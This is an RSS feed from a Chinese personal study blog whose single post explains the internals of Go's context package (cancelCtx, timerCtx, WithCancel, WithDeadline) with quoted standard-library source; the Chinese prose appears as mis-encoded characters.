<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>æ‰€æœ‰æ–‡ç«  - èœç‹—ç‘çš„å­¦ä¹ å‘¨è®°</title>
        <link>https://testoai.github.io/posts/</link>
        <description>æ‰€æœ‰æ–‡ç«  | èœç‹—ç‘çš„å­¦ä¹ å‘¨è®°</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Tue, 11 May 2021 00:00:00 &#43;0800</lastBuildDate><atom:link href="https://testoai.github.io/posts/" rel="self" type="application/rss+xml" /><item>
    <title>Golangä¹‹Context</title>
    <link>https://testoai.github.io/posts/golang-context/</link>
    <pubDate>Tue, 11 May 2021 00:00:00 &#43;0800</pubDate>
    <author>ä½œè€…</author>
    <guid>https://testoai.github.io/posts/golang-context/</guid>
    <description><![CDATA[<p>å¯¹contextçš„æºç ç†è§£è¿˜æ²¡æœ‰å¾ˆæ·±ï¼Œå½“å‰åªå¤„äºå­¦ä¹ é˜¶æ®µ</p>
<h2 id="contextæ˜¯å•¥">Contextæ˜¯å•¥</h2>
<p>contextæ˜¯goä¸­è·¨è¶ŠAPIè¾¹ç•Œä»¥åŠè¿›ç¨‹ä¹‹é—´çš„å–æ¶ˆä¿¡å·å’Œå…¶ä»–è¯·æ±‚èŒƒå›´çš„å€¼ &ndash;æ‘˜è‡ªcontex.context.go</p>
<p>åœ¨Go1.7ç‰ˆæœ¬ä¸­å¼•å…¥äº†contextï¼Œä¸»è¦ç”¨äºåœ¨goroutineä¹‹é—´ä¼ é€’ä¸Šä¸‹æ–‡æ¶ˆæ¯ï¼ŒåŒ…æ‹¬å–æ¶ˆä¿¡å·ï¼Œè¶…æ—¶æ—¶é—´ï¼Œæˆªæ­¢æ—¶é—´ï¼Œé”®å€¼å¯¹</p>
<p>contextæ˜¯å¹¶å‘å®‰å…¨çš„</p>
<h2 id="ä¸ºä»€ä¹ˆéœ€è¦context">ä¸ºä»€ä¹ˆéœ€è¦Context</h2>
<p>åœ¨goä¸­ï¼Œæ¯ä¸ªè¯·æ±‚éœ€è¦å¼€å¯ä¸€ä¸ªgoroutineå»å¤„ç†ï¼Œä½†æ˜¯åœ¨å¤§éƒ¨åˆ†ä¸šåŠ¡æµç¨‹ä¸­ï¼Œä¸€ä¸ªgoroutineå¹¶ä¸èƒ½å¾ˆå¥½çš„æ»¡è¶³éœ€æ±‚ï¼Œé€šå¸¸ä¸€ä¸ªè¯·æ±‚éœ€è¦å¼€å¯å¤šä¸ªgoroutineæ¥å¤„ç†è¯¥è¯·æ±‚ï¼Œæ¯”å¦‚ä¸€äº›é¢„å¤„ç†çš„å·¥ä½œ</p>
<p>ä½†æ˜¯åœ¨ä¸šåŠ¡ä¸­ç”±äºæŸäº›åŸå› ï¼ˆæ¯”å¦‚æ“ä½œè¢«å–æ¶ˆï¼Œè¯·æ±‚è¶…æ—¶ç­‰ï¼‰ï¼Œä¸šåŠ¡æµç¨‹å¯èƒ½ä¼šè¢«ä¸­æ–­ï¼Œé‚£ä¹ˆç”±è¯¥è¯·æ±‚å¼€å¯çš„ä¸€äº›goroutineå°±ä¼šå˜æˆå­¤å„¿åç¨‹ï¼Œé€ æˆèµ„æºæµªè´¹</p>
<p>é‚£ä¹ˆæ­¤æ—¶å°±éœ€è¦æ¥é€šçŸ¥è¿™äº›goroutineå…³é—­</p>
<p>åœ¨goä¸­channel+selectå¯ä»¥ç”¨æ¥ç»™å­goroutineå‘é€ä¿¡å·ï¼Œé€šçŸ¥å®ƒä»¬å…³é—­ï¼Œä½†æ˜¯åœ¨æŸäº›åœºæ™¯ä¸‹ç”¨è¯¥æ–¹å¼å°±ä¼šæ¯”è¾ƒå¤æ‚ï¼Œæä¸å¥½å®¹æ˜“å†™å‡ºé—®é¢˜</p>
<p>äºæ˜¯contextåº”è¿è€Œç”Ÿ</p>
<h2 id="contextåŒ…">ContextåŒ…</h2>
<h3 id="contextæ¥å£">contextæ¥å£ï¼š</h3>
<ul>
<li>
<p><code>Deadline()</code>ï¼šè¿”å›contextçš„æˆªæ­¢æ—¶é—´ï¼Œé€šè¿‡åˆ¤æ–­è¯¥æ—¶é—´ï¼Œå‡½æ•°å°±èƒ½å†³å®šæ˜¯å¦è¿›è¡Œä¸‹é¢çš„æ“ä½œ</p>
</li>
<li>
<p><code>Done()</code>ï¼šè¿”å›ä¸€ä¸ªåªè¯»çš„channelï¼Œè¡¨ç¤ºcontextè¢«å–æ¶ˆçš„ä¿¡å·ï¼Œå½“è¿™ä¸ªchannelè¢«å…³é—­æ—¶ï¼Œè¯´æ˜contextè¢«å–æ¶ˆäº†ã€‚</p>
<ul>
<li>channelä¸ºç©ºä¸”ä¸å…³é—­æ—¶ï¼Œè¯»ä¸å‡ºä»»ä½•ä¸œè¥¿ï¼Œå½“å…³é—­æ—¶ï¼Œåˆ™ä¼šè¯»å‡ºå­˜å‚¨ç±»å‹çš„é›¶å€¼</li>
</ul>
</li>
<li>
<p><code>Err()</code>ï¼šè¿”å›channelè¢«å…³é—­çš„åŸå› </p>
</li>
<li>
<p><code>Value()</code>ï¼šè·å–è®¾ç½®çš„keyæ‰€å¯¹åº”çš„val</p>
</li>
</ul>
<h3 id="canceleræ¥å£">Canceleræ¥å£ï¼š</h3>
<ul>
<li>è¯¥æ¥å£å®šä¹‰äº†cancelæ–¹æ³•å’ŒDoneæ–¹æ³•ï¼Œç”¨æ¥å–æ¶ˆcontext</li>
<li>å®ç°äº†è¿™ä¸¤ä¸ªæ–¹æ³•çš„structæ˜¯ï¼š<code>*cancelCtx</code>å’Œ<code>*timeCtx</code></li>
</ul>
<h3 id="emptyctx">emptyCtx</h3>
<p><code>type emptyCtx int</code></p>
<ul>
<li>
<p>emptyCtxæ°¸è¿œä¸ä¼šå–æ¶ˆï¼Œæ²¡æœ‰å€¼ï¼Œä¹Ÿæ²¡æœ‰æˆªæ­¢æ—¥æœŸ</p>
</li>
<li>
<p>å®ƒä¸æ˜¯struct {}ï¼Œå› ä¸ºæ­¤ç±»å‹çš„varå¿…é¡»å…·æœ‰ä¸åŒçš„åœ°å€</p>
</li>
</ul>
<p>è¯¥ç±»å‹ä½“å®ç°äº†contextæ¥å£ä¸­å®šä¹‰çš„æ–¹æ³•</p>
<p>ä¸‹é¢å®šä¹‰äº†ä¸¤ä¸ªå˜é‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-GO" data-lang="GO"><span class="kd">var</span> <span class="p">(</span>
	<span class="nx">background</span> <span class="p">=</span> <span class="nb">new</span><span class="p">(</span><span class="nx">emptyCtx</span><span class="p">)</span>
	<span class="nx">todo</span>       <span class="p">=</span> <span class="nb">new</span><span class="p">(</span><span class="nx">emptyCtx</span><span class="p">)</span>
<span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>ç„¶åé€šè¿‡ä¸‹é¢ä¸¤ä¸ªæ–¹æ³•å¯¹å¤–å¼€æ”¾</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="c1">// Background returns a non-nil, empty Context. It is never canceled, has no
</span><span class="c1">// values, and has no deadline. It is typically used by the main function,
</span><span class="c1">// initialization, and tests, and as the top-level Context for incoming
</span><span class="c1">// requests.
</span><span class="c1"></span><span class="kd">func</span> <span class="nf">Background</span><span class="p">()</span> <span class="nx">Context</span> <span class="p">{</span>
   <span class="k">return</span> <span class="nx">background</span>
<span class="p">}</span>

<span class="c1">// TODO returns a non-nil, empty Context. Code should use context.TODO when
</span><span class="c1">// it&#39;s unclear which Context to use or it is not yet available (because the
</span><span class="c1">// surrounding function has not yet been extended to accept a Context
</span><span class="c1">// parameter).
</span><span class="c1"></span><span class="kd">func</span> <span class="nf">TODO</span><span class="p">()</span> <span class="nx">Context</span> <span class="p">{</span>
   <span class="k">return</span> <span class="nx">todo</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>Backgroundä¸»è¦ç”¨æ¥åˆå§‹åŒ–æ ¹èŠ‚ç‚¹ï¼Œæ˜¯contextçš„é»˜è®¤å€¼ï¼Œå¹¶ä¸”è¿˜ä½œä¸ºä¸Šä¸‹æ–‡çš„æ ¹èŠ‚ç‚¹å­˜åœ¨</p>
</li>
<li>
<p>TODOæ–¹æ³•è¿”å›ä¸€ä¸ªéç©ºçš„contextï¼Œå½“ä¸çŸ¥é“è¦ä¼ å…¥é‚£ä¸ªcontextæ—¶ï¼Œå¯ä»¥ä¼ å…¥context.TODO</p>
</li>
</ul>
<h3 id="cancelctxç»“æ„ä½“">cancelCtxç»“æ„ä½“</h3>
<p>cancelCtxå¯ä»¥è¢«å–æ¶ˆï¼Œè¯¥ç»“æ„ä½“å®ç°äº†canceleræ¥å£ï¼Œå®ƒå°†Contextä½œä¸ºå®ƒçš„ä¸€ä¸ªåŒ¿åå­—æ®µï¼Œè¿™æ ·è¯¥ç»“æ„ä½“å°±å¯ä»¥è¢«çœ‹ä½œæˆä¸€ä¸ªcontext</p>
<p><code>Done()</code>æ–¹æ³•ï¼šè¯¥æ–¹æ³•è¢«è°ƒç”¨æ—¶æ‰ä¼šmakeä¸€ä¸ªå­˜æ”¾structçš„channelï¼Œç„¶åæŠŠè¯¥channelè¿”å›</p>
<p><code>Err()</code>æ–¹æ³•ï¼šè¯¥æ–¹æ³•è¿”å›ä¸€ä¸ªcontextå–æ¶ˆçš„åŸå› </p>
<p><code>cancel()</code>æ–¹æ³•ï¼šé€šè¿‡å…³é—­c.doneï¼Œé€’å½’å–æ¶ˆä¼ é€’ä¸‹å»çš„æ‰€æœ‰å­èŠ‚ç‚¹ï¼Œä»çˆ¶èŠ‚ç‚¹åˆ é™¤è‡ªå·±ï¼Œå­goroutineæ¥æ”¶å…³é—­ä¿¡å·çš„æ–¹å¼å°±æ˜¯selectåªè¯»çš„c.done</p>
<h3 id="withcancelå‡½æ•°">WithCancelå‡½æ•°</h3>
<p>è¯¥å‡½æ•°éœ€è¦ä¼ å…¥ä¸€ä¸ªæ ¹èŠ‚ç‚¹ï¼Œä¸Šé¢è¯´çš„Backgroundï¼Œç„¶åä¼šè¿”å›ä¸€ä¸ªå­contextï¼Œå’Œä¸€ä¸ªç”¨äºå–æ¶ˆå­contextçš„cancelå‡½æ•°ï¼Œä¸€æ—¦è°ƒç”¨cancelå‡½æ•°ï¼Œå½“å‰contextçš„å­èŠ‚ç‚¹å°±ä¼šselectåˆ°å…³é—­çš„c.doneï¼Œä»è€Œå…³é—­goroutine</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-GO" data-lang="GO"><span class="kd">func</span> <span class="nf">WithCancel</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">)</span> <span class="p">(</span><span class="nx">ctx</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">cancel</span> <span class="nx">CancelFunc</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">c</span> <span class="o">:=</span> <span class="nf">newCancelCtx</span><span class="p">(</span><span class="nx">parent</span><span class="p">)</span>
	<span class="nf">propagateCancel</span><span class="p">(</span><span class="nx">parent</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">c</span><span class="p">)</span>
	<span class="k">return</span> <span class="o">&amp;</span><span class="nx">c</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span> <span class="nx">c</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="nx">Canceled</span><span class="p">)</span> <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li><code>newCancelCtx</code>å°†ä¼ å…¥çš„ä¸Šä¸‹æ–‡åŒ…è£…æˆç§æœ‰ç»“æ„ä½“context.cancelCtx</li>
<li><code>propagateCancel</code>å‡½æ•°ä¼šæ„å»ºä¸Šä¸‹æ–‡ä¹‹é—´çš„å…³è”ï¼Œå½“çˆ¶contextè¢«å–æ¶ˆæ—¶ï¼Œå–æ¶ˆå­context</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-GO" data-lang="GO"><span class="kd">func</span> <span class="nf">propagateCancel</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">child</span> <span class="nx">canceler</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">done</span> <span class="o">:=</span> <span class="nx">parent</span><span class="p">.</span><span class="nf">Done</span><span class="p">()</span>
	<span class="k">if</span> <span class="nx">done</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="k">return</span> <span class="c1">// çˆ¶ä¸Šä¸‹æ–‡ä¸ä¼šè§¦å‘å–æ¶ˆä¿¡å·
</span><span class="c1"></span>	<span class="p">}</span>
	<span class="k">select</span> <span class="p">{</span>
	<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">done</span><span class="p">:</span>
		<span class="nx">child</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="nx">parent</span><span class="p">.</span><span class="nf">Err</span><span class="p">())</span> <span class="c1">// çˆ¶ä¸Šä¸‹æ–‡å·²ç»è¢«å–æ¶ˆ
</span><span class="c1"></span>		<span class="k">return</span>
	<span class="k">default</span><span class="p">:</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="nx">p</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nf">parentCancelCtx</span><span class="p">(</span><span class="nx">parent</span><span class="p">);</span> <span class="nx">ok</span> <span class="p">{</span>
		<span class="nx">p</span><span class="p">.</span><span class="nx">mu</span><span class="p">.</span><span class="nf">Lock</span><span class="p">()</span>
		<span class="k">if</span> <span class="nx">p</span><span class="p">.</span><span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
			<span class="nx">child</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="nx">p</span><span class="p">.</span><span class="nx">err</span><span class="p">)</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="nx">p</span><span class="p">.</span><span class="nx">children</span><span class="p">[</span><span class="nx">child</span><span class="p">]</span> <span class="p">=</span> <span class="kd">struct</span><span class="p">{}{}</span>
		<span class="p">}</span>
		<span class="nx">p</span><span class="p">.</span><span class="nx">mu</span><span class="p">.</span><span class="nf">Unlock</span><span class="p">()</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
			<span class="k">select</span> <span class="p">{</span>
			<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">parent</span><span class="p">.</span><span class="nf">Done</span><span class="p">():</span>
				<span class="nx">child</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="nx">parent</span><span class="p">.</span><span class="nf">Err</span><span class="p">())</span>
			<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">child</span><span class="p">.</span><span class="nf">Done</span><span class="p">():</span>
			<span class="p">}</span>
		<span class="p">}()</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>å¯¹ä¸Šé¢ä»£ç çš„è§£è¯»</p>
<ul>
<li>
<p>å¦‚æœcontext.Doneä¸ºç©ºæ—¶ï¼Œåˆ™ä¸ä¼šå‡ºå‘å–æ¶ˆäº‹ä»¶ï¼Œå‡½æ•°ç›´æ¥è¿”å›</p>
</li>
<li>
<p>å½“ä¼ å…¥çš„æ ¹èŠ‚ç‚¹çš„contextå¯¹è±¡çš„Doneè¢«å…³é—­æ—¶ï¼Œchildä¹Ÿå°±æ˜¯å­contextä¼šè¢«ç›´æ¥å–æ¶ˆ</p>
</li>
<li>
<p><code>parentCancelCtx</code>å‡½æ•°è¿”å›çˆ¶çº§çš„åŸºç¡€<code>*cancelCtx</code>ï¼Œå¦‚æœæ˜¯çˆ¶çº§ä¹Ÿæ˜¯<code>*context</code>æ—¶ï¼Œ</p>
</li>
<li>
<p>childä¼šè¢«åŠ å…¥æ ¹contextçš„childrenåˆ—è¡¨ä¸­ï¼Œç­‰å¾…æ ¹contextå‘é€å–æ¶ˆä¿¡å·</p>
</li>
<li>
<p>å¦‚æœçˆ¶çº§ä¸æ˜¯<code>*context</code>çš„è¯ï¼Œåˆ™å¼€å¯ä¸€ä¸ªæ–°çš„goroutineç›‘å¬æ ¹èŠ‚ç‚¹çš„Done()ï¼Œå’Œchild.Done()ä¸¤ä¸ªchannelï¼Œå¦‚æœæ ¹èŠ‚ç‚¹çš„Done()è¢«å…³é—­æ—¶ï¼Œåˆ™è°ƒç”¨childçš„cancelå–æ¶ˆå­ä¸Šä¸‹æ–‡</p>
</li>
</ul>
<p>æ‰€ä»¥è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯åœ¨æ ¹contextå’Œå­contextä¹‹é—´åŒæ­¥å–æ¶ˆä¿¡å·ï¼Œä¿è¯æ ¹contextè¢«å–æ¶ˆåï¼Œå­contextä¹Ÿèƒ½æ”¶åˆ°å–æ¶ˆä¿¡å·</p>
<h4 id="contextconcelctxcancel">context.concelCtx.cancel()</h4>
<p>è¯¥æ–¹æ³•ä¼šå…³é—­contextä¸­çš„channelå¹¶åŒæ­¥å–æ¶ˆä¿¡å·</p>
<h3 id="timerctx">timerCtx</h3>
<p>è¯¥ç»“æ„ä½“åŸºäº<code>cancelCtx</code>ï¼Œæ·»åŠ äº†time.Timerå’Œdeadline</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="c1">// A timerCtx carries a timer and a deadline. It embeds a cancelCtx to
</span><span class="c1">// implement Done and Err. It implements cancel by stopping its timer then
</span><span class="c1">// delegating to cancelCtx.cancel.
</span><span class="c1"></span><span class="kd">type</span> <span class="nx">timerCtx</span> <span class="kd">struct</span> <span class="p">{</span>
	<span class="nx">cancelCtx</span>
	<span class="nx">timer</span> <span class="o">*</span><span class="nx">time</span><span class="p">.</span><span class="nx">Timer</span> <span class="c1">// Under cancelCtx.mu.
</span><span class="c1"></span>
	<span class="nx">deadline</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Time</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>é€šè¿‡cancelCtxæ¥å®ç°Doneå’ŒErr</p>
<p>è®¡æ—¶å™¨åˆ°æœŸæ—¶åˆ™é€šçŸ¥cancelCtx.cancelæ¥å…³é—­context</p>
<p><code>*timerCtx.cancel</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">timerCtx</span><span class="p">)</span> <span class="nf">cancel</span><span class="p">(</span><span class="nx">removeFromParent</span> <span class="kt">bool</span><span class="p">,</span> <span class="nx">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">c</span><span class="p">.</span><span class="nx">cancelCtx</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">removeFromParent</span> <span class="p">{</span>
		<span class="c1">// Remove this timerCtx from its parent cancelCtx&#39;s children.
</span><span class="c1"></span>		<span class="nf">removeChild</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">cancelCtx</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">c</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="nx">c</span><span class="p">.</span><span class="nx">mu</span><span class="p">.</span><span class="nf">Lock</span><span class="p">()</span>
	<span class="k">if</span> <span class="nx">c</span><span class="p">.</span><span class="nx">timer</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">c</span><span class="p">.</span><span class="nx">timer</span><span class="p">.</span><span class="nf">Stop</span><span class="p">()</span>
		<span class="nx">c</span><span class="p">.</span><span class="nx">timer</span> <span class="p">=</span> <span class="kc">nil</span>
	<span class="p">}</span>
	<span class="nx">c</span><span class="p">.</span><span class="nx">mu</span><span class="p">.</span><span class="nf">Unlock</span><span class="p">()</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>ç¬¬äºŒè¡Œè°ƒç”¨äº†contextCtxçš„cancelæ–¹æ³•</p>
<p>ç¬¬ä¸‰è¡Œï¼Œå¦‚æœremoveFromParentä¸ºtrueï¼Œåˆ™è°ƒç”¨removeChildæ–¹æ³•ä»çˆ¶èŠ‚ç‚¹ä¸­åˆ é™¤å­èŠ‚ç‚¹</p>
<p>ç¬¬å…«è¡Œï¼Œå¦‚æœå®šæ—¶å™¨ä¸ä¸ºç©ºï¼Œåˆ™åœæ­¢è®¡æ—¶ï¼Œé˜²æ­¢æ—¶é—´åˆ°äº†ä¹‹åå†æ¬¡å‘èµ·å–æ¶ˆä¿¡å·</p>
<h3 id="withtimeoutå‡½æ•°">WithTimeoutå‡½æ•°</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-GO" data-lang="GO"><span class="kd">func</span> <span class="nf">WithTimeout</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">timeout</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Duration</span><span class="p">)</span> <span class="p">(</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">CancelFunc</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="nf">WithDeadline</span><span class="p">(</span><span class="nx">parent</span><span class="p">,</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Now</span><span class="p">().</span><span class="nf">Add</span><span class="p">(</span><span class="nx">timeout</span><span class="p">))</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>è¯¥å‡½æ•°è¿”å›çš„æ˜¯WithDeadlineå‡½æ•°ï¼Œå‚æ•°æ˜¯ä¸€ä¸ªæ ¹contextå¯¹è±¡å’Œå½“å‰æ—¶é—´+è¶…æ—¶æ—¶é—´</p>
<h3 id="withdeadlineå‡½æ•°">WithDeadlineå‡½æ•°</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">WithDeadline</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">d</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Time</span><span class="p">)</span> <span class="p">(</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">CancelFunc</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">if</span> <span class="nx">cur</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">parent</span><span class="p">.</span><span class="nf">Deadline</span><span class="p">();</span> <span class="nx">ok</span> <span class="o">&amp;&amp;</span> <span class="nx">cur</span><span class="p">.</span><span class="nf">Before</span><span class="p">(</span><span class="nx">d</span><span class="p">)</span> <span class="p">{</span>
      <span class="c1">// The current deadline is already sooner than the new one.
</span><span class="c1"></span>      <span class="k">return</span> <span class="nf">WithCancel</span><span class="p">(</span><span class="nx">parent</span><span class="p">)</span>
   <span class="p">}</span>
   <span class="nx">c</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">timerCtx</span><span class="p">{</span>
      <span class="nx">cancelCtx</span><span class="p">:</span> <span class="nf">newCancelCtx</span><span class="p">(</span><span class="nx">parent</span><span class="p">),</span>
      <span class="nx">deadline</span><span class="p">:</span>  <span class="nx">d</span><span class="p">,</span>
   <span class="p">}</span>
   <span class="nf">propagateCancel</span><span class="p">(</span><span class="nx">parent</span><span class="p">,</span> <span class="nx">c</span><span class="p">)</span>
   <span class="nx">dur</span> <span class="o">:=</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Until</span><span class="p">(</span><span class="nx">d</span><span class="p">)</span>
   <span class="k">if</span> <span class="nx">dur</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">{</span>
      <span class="nx">c</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="nx">DeadlineExceeded</span><span class="p">)</span> <span class="c1">// deadline has already passed
</span><span class="c1"></span>      <span class="k">return</span> <span class="nx">c</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span> <span class="nx">c</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="nx">Canceled</span><span class="p">)</span> <span class="p">}</span>
   <span class="p">}</span>
   <span class="nx">c</span><span class="p">.</span><span class="nx">mu</span><span class="p">.</span><span class="nf">Lock</span><span class="p">()</span>
   <span class="k">defer</span> <span class="nx">c</span><span class="p">.</span><span class="nx">mu</span><span class="p">.</span><span class="nf">Unlock</span><span class="p">()</span>
   <span class="k">if</span> <span class="nx">c</span><span class="p">.</span><span class="nx">err</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
      <span class="nx">c</span><span class="p">.</span><span class="nx">timer</span> <span class="p">=</span> <span class="nx">time</span><span class="p">.</span><span class="nf">AfterFunc</span><span class="p">(</span><span class="nx">dur</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
         <span class="nx">c</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="nx">DeadlineExceeded</span><span class="p">)</span>
      <span class="p">})</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="nx">c</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span> <span class="nx">c</span><span class="p">.</span><span class="nf">cancel</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="nx">Canceled</span><span class="p">)</span> <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>å®˜æ–¹æ³¨é‡Šå†™çš„æ˜¯è¯¥å‡½æ•°è¿”å›çˆ¶contextçš„childrenï¼Œå¹¶å°†æˆªæ­¢æ—¥æœŸè°ƒæ•´ä¸ºä¸æ™šäºä¼ å…¥çš„æ—¶é—´</p>
<p>ç¬¬äºŒè¡Œï¼Œå¦‚æœçˆ¶çº§çš„æˆªæ­¢æ—¶é—´æ›´æ—©ï¼Œåˆ™è¿”å›</p>
